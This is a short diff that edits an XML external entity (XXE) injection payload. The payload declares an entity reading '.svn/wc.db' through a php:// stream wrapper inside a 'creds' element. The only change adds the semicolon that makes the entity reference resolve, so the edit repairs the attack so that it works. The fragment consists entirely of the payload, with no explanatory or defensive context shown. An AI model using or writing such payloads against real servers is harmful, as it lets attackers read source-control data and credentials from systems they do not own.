@@ -3,5 +3,5 @@
   <!ELEMENT foo ANY >
   <!ENTITY file SYSTEM "php://filter/.svn/wc.db" >]>
 <creds>
-  <text>&file</text>
+  <text>&file;</text>
 </creds>
